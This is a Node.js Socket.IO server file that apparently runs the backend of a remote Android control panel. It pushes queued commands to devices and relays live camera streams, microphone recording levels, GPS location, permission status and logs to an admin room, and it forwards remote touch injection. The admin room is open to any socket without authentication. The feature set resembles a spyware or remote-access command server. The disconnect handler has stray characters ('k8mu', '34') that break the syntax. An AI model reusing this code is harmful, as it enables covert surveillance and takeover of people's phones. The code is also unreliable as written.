const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient();

// Firebase for instant status updates
const { setDeviceStatus } = require('../lib/firebase');

// Use shared state for connected devices
const { connectedDevices } = require('../shared/state');

/**
 * Setup Socket.IO handlers
 */
function setupSocketHandlers(io) {
    io.on('connection', (socket) => {
        console.log(`[SOCKET] New connection: ${socket.id}`);

        /**
         * Device identifies itself
         */
        socket.on('device:connect', async (data) => {
            try {
                const { deviceId, batteryLevel, networkType, isCharging, timestamp } = data;
                if (!deviceId) return;

                // Track this connection
                socket.join(`device:${deviceId}`);
                connectedDevices.set(socket.id, deviceId);

                // Update database with status data if provided
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (device) {
                    const updateData = {
                        isOnline: true,
                        lastSeen: new Date()
                    };

                    // Include battery/network if provided (instant status update)
                    if (batteryLevel !== undefined) updateData.battery = batteryLevel;
                    if (networkType !== undefined) updateData.network = networkType;
                    if (isCharging !== undefined) updateData.isCharging = isCharging;

                    await prisma.device.update({
                        where: { id: device.id },
                        data: updateData
                    });

                    // Send pending commands
                    const pendingCommands = await prisma.command.findMany({
                        where: { deviceId: device.id, status: 'pending' }
                    });
                    for (const cmd of pendingCommands) {
                        socket.emit('command:execute', {
                            id: cmd.id,
                            type: cmd.type,
                            payload: cmd.payload ? JSON.parse(cmd.payload) : null
                        });
                        await prisma.command.update({
                            where: { id: cmd.id },
                            data: { status: 'sent' }
                        });
                    }
                }

                // UPDATE FIREBASE -> This triggers admin panel update instantly
                setDeviceStatus(deviceId, true, {
                    model: device?.model,
                    manufacturer: device?.manufacturer
                });

                console.log(`[SOCKET] Device ONLINE: ${deviceId} (Battery: ${batteryLevel}%, Network: ${networkType})`);

                // Emit device online event
                io.to('admin').emit('device:online', { deviceId });

                // IMMEDIATELY forward device status to admin if battery/network provided
                if (batteryLevel !== undefined || networkType !== undefined) {
                    io.to('admin').emit('device:status', {
                        deviceId,
                        batteryLevel,
                        networkType,
                        isCharging,
                        timestamp: timestamp || Date.now()
                    });
                }
            } catch (error) {
                console.error('[SOCKET] Connect error:', error);
            }
        });

        /**
         * Device heartbeat - keep status fresh
         */
        socket.on('device:heartbeat', async (data) => {
            try {
                const { deviceId, batteryLevel, networkType, isCharging } = data;
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (device) {
                    await prisma.device.update({
                        where: { id: device.id },
                        data: { lastSeen: new Date(), isOnline: true }
                    });
                    // Keep Firebase status fresh
                    setDeviceStatus(deviceId, true);

                    // Forward device status to admin if present
                    if (batteryLevel !== undefined || networkType !== undefined) {
                        io.to('admin').emit('device:status', {
                            deviceId,
                            batteryLevel,
                            networkType,
                            isCharging,
                            timestamp: Date.now()
                        });
                    }
                }
                socket.emit('heartbeat:ack', { timestamp: Date.now() });
            } catch (error) {
                console.error('[SOCKET] Heartbeat error:', error);
            }
        });

        /**
         * Device status update (battery, network, etc.)
         */
        socket.on('device:status', (data) => {
            const { deviceId, batteryLevel, networkType, isCharging } = data;
            console.log(`[SOCKET] Device status from ${deviceId}: Battery ${batteryLevel}%, ${networkType}`);
            io.to('admin').emit('device:status', {
                deviceId,
                batteryLevel,
                networkType,
                isCharging,
                timestamp: Date.now()
            });
        });

        /**
         * Admin joins admin room
         */
        socket.on('admin:join', () => {
            socket.join('admin');
            console.log(`[SOCKET] Admin joined: ${socket.id}`);
        });

        /**
         * Stream viewer joins stream room
         */
        socket.on('stream:join', ({ deviceId }) => {
            socket.join(`stream:${deviceId}`);
            console.log(`[SOCKET] Viewer joined stream: ${deviceId}`);
        });

        socket.on('stream:leave', ({ deviceId }) => {
            socket.leave(`stream:${deviceId}`);
        });

        /**
         * Stream frame from device
         */
        socket.on('stream:frame', (data) => {
            const { deviceId, frame, timestamp } = data;
            io.to(`stream:${deviceId}`).emit('stream:frame', { deviceId, frame, timestamp });
        });

        /**
         * Recording amplitude from device
         */
        socket.on('recording:amplitude', (data) => {
            const deviceId = connectedDevices.get(socket.id);
            io.to('admin').emit('recording:amplitude', { ...data, deviceId });
        });

        /**
         * Recording status from device
         */
        socket.on('recording:status', (data) => {
            const deviceId = connectedDevices.get(socket.id);
            io.to('admin').emit('recording:status', { ...data, deviceId });
        });

        /**
         * Permission status from device
         */
        socket.on('device:permissions', (data) => {
            const { deviceId, permissions, timestamp } = data;
            console.log(`[SOCKET] Permission status from ${deviceId}`);
            // Forward to admin room
            io.to('admin').emit('device:permissions', { deviceId, permissions, timestamp });
        });

        /**
         * App log from device - real-time log streaming
         */
        socket.on('device:log', async (data) => {
            const { deviceId, level, tag, message, timestamp } = data;
            // Forward to admin room for real-time viewing
            io.to('admin').emit('device:log', { deviceId, level, tag, message, timestamp });

            // Optionally store important logs in database
            if (level === 'ERROR' || level === 'WARN') {
                try {
                    await prisma.deviceLog.create({
                        data: {
                            deviceId,
                            level,
                            tag,
                            message,
                            timestamp: new Date(timestamp)
                        }
                    });
                } catch (err) {
                    // Silently fail - log storage is non-critical
                }
            }
        });

        /**
         * Real-time Location from device
         */
        socket.on('device:location', (data) => {
            const deviceId = connectedDevices.get(socket.id);
            if (!deviceId) return;
            // Forward live location to admin room, ensure deviceId is in payload
            io.to('admin').emit('location:update', { ...data, deviceId });
        });

        /**
         * WebRTC Signaling - Offer from device
         */
        socket.on('webrtc:offer', (data) => {
            const { deviceId, sdp } = data;
            console.log(`[WEBRTC] Offer from device ${deviceId}`);
            // Forward to admin viewers
            io.to(`stream:${deviceId}`).emit('webrtc:offer', { deviceId, sdp });
        });

        /**
         * WebRTC Signaling - Answer from admin
         */
        socket.on('webrtc:answer', (data) => {
            const { deviceId, sdp } = data;
            console.log(`[WEBRTC] Answer for device ${deviceId}`);
            // Android expects a JSON string in the 'sdp' field
            const sdpString = typeof sdp === 'object' ? JSON.stringify(sdp) : sdp;
            io.to(`device:${deviceId}`).emit('webrtc:answer', { sdp: sdpString });
        });

        /**
         * WebRTC Signaling - ICE Candidate
         */
        socket.on('webrtc:ice-candidate', (data) => {
            const { deviceId, candidate, from } = data;
            if (from === 'device') {
                // To admin - keep as objects, admin handles them
                io.to(`stream:${deviceId}`).emit('webrtc:ice-candidate', { deviceId, candidate });
            } else {
                // To device - Android expects a JSON string
                const candidateString = typeof candidate === 'object' ? JSON.stringify(candidate) : candidate;
                io.to(`device:${deviceId}`).emit('webrtc:ice-candidate', { candidate: candidateString });
            }
        });

        /**
         * Camera stream started notification
         */
        socket.on('camera:started', (data) => {
            const { deviceId, streamType } = data;
            console.log(`[CAMERA] Stream started from ${deviceId}: ${streamType}`);
            io.to(`stream:${deviceId}`).emit('camera:started', { deviceId, streamType });
        });

        /**
         * Camera stream stopped notification
         */
        socket.on('camera:stopped', (data) => {
            const { deviceId } = data;
            console.log(`[CAMERA] Stream stopped from ${deviceId}`);
            io.to(`stream:${deviceId}`).emit('camera:stopped', { deviceId });
        });

        /**
         * Camera stream error
         */
        socket.on('camera:error', (data) => {
            const { deviceId, error } = data;
            console.log(`[CAMERA] Error from ${deviceId}: ${error}`);
            io.to(`stream:${deviceId}`).emit('camera:error', { deviceId, error });
        });

        /**
         * Command result from device
         */
        socket.on('command:result', async (data) => {
            const { commandId, deviceId, success, result } = data;
            try {
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (device) {
                    await prisma.command.updateMany({
                        where: { id: commandId, deviceId: device.id },
                        data: {
                            status: success ? 'completed' : 'failed',
                            result: result ? JSON.stringify(result) : null,
                            completedAt: new Date()
                        }
                    });
                }
                io.to('admin').emit('command:result', { commandId, deviceId, success, result });
            } catch (error) {
                console.error('[SOCKET] Command result error:', error);
            }
        });

        /**
         * Send command to device (from admin panel)
         */
        socket.on('admin:sendCommand', async (data) => {
            const { deviceId, type, payload } = data;
            try {
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (!device) return;

                const command = await prisma.command.create({
                    data: {
                        deviceId: device.id,
                        type,
                        payload: payload ? JSON.stringify(payload) : null,
                        status: 'sent'
                    }
                });

                io.to(`device:${deviceId}`).emit('command:execute', {
                    id: command.id,
                    type,
                    payload
                });

                console.log(`[SOCKET] Command sent to ${deviceId}: ${type}`);
            } catch (error) {
                console.error('[SOCKET] Send command error:', error);
            }
        });

        // Handle command from admin panel
        socket.on('command:send', async (data) => {
            const { deviceId, type, payload } = data;
            console.log(`[SOCKET] Command request: ${type} for ${deviceId}`);

            try {
                // Get device from DB
                const device = await prisma.device.findUnique({ where: { deviceId } });
                if (!device) {
                    console.log(`[SOCKET] Device not found: ${deviceId}`);
                    return;
                }

                // Create command in DB
                const command = await prisma.command.create({
                    data: {
                        deviceId: device.id,
                        type,
                        payload: payload ? JSON.stringify(payload) : null,
                        status: 'sent'
                    }
                });

                // Send to device
                io.to(`device:${deviceId}`).emit('command:execute', {
                    id: command.id,
                    type,
                    payload
                });

                console.log(`[SOCKET] Command ${command.id} sent: ${type}`);
            } catch (error) {
                console.error('[SOCKET] Command send error:', error);
            }
        });

        // Stream watching
        socket.on('stream:watch', ({ deviceId }) => {
            socket.join(`stream:${deviceId}`);
            console.log(`[SOCKET] Watching stream: ${deviceId}`);
        });

        socket.on('stream:unwatch', ({ deviceId }) => {
            socket.leave(`stream:${deviceId}`);
            console.log(`[SOCKET] Unwatching stream: ${deviceId}`);
        });

        // WebRTC stop stream - send directly to device's webrtc:stop listener
        socket.on('webrtc:stop', ({ deviceId }) => {
            console.log(`[WEBRTC] Stop requested for: ${deviceId}`);
            // Device's SocketManager listens for webrtc:stop directly (no args)
            io.to(`device:${deviceId}`).emit('webrtc:stop');
            // Notify admin state reset
            io.to(`stream:${deviceId}`).emit('webrtc:stopped', { deviceId });
        });

        // Stream quality change - relay to device
        socket.on('stream:quality', ({ deviceId, quality }) => {
            console.log(`[STREAM] Quality change for ${deviceId}: ${quality}`);
            io.to(`device:${deviceId}`).emit('stream:quality', { quality });
        });

        /**
         * Remote touch/gesture from admin - relay to device
         */
        socket.on('admin:touch', (data) => {
            const { deviceId, ...touchData } = data;
            if (!deviceId) return;

            console.log(`[REMOTE] Touch event for ${deviceId}: ${touchData.type}`);
            // Forward directly to device
            io.to(`device:${deviceId}`).emit('remote:touch', touchData);
        });

        /**
         * Socket disconnected - INSTANT offline detectionk8mu
         */
        socket.on('disconnect', async () => {
            const deviceId = connectedDevices.get(socket.id); 34

            if (deviceId) {
                connectedDevices.delete(socket.id);

                try {
                    const device = await prisma.device.findUnique({ where: { deviceId } });
                    if (device) {
                        await prisma.device.update({
                            where: { id: device.id },
                            data: { isOnline: false }
                        });
                    }

                    // UPDATE FIREBASE -> This triggers admin panel update instantly
                    setDeviceStatus(deviceId, false);

                    console.log(`[SOCKET] Device OFFLINE: ${deviceId}`);
                    io.to('admin').emit('device:offline', { deviceId });
                } catch (error) {
                    console.error('[SOCKET] Disconnect error:', error);
                }
            }

            console.log(`[SOCKET] Connection closed: ${socket.id}`);
        });
    });

    console.log('[SOCKET] Handlers ready');
}

// Export for API routes to check connected devices
module.exports = setupSocketHandlers;
module.exports.connectedDevices = connectedDevices;
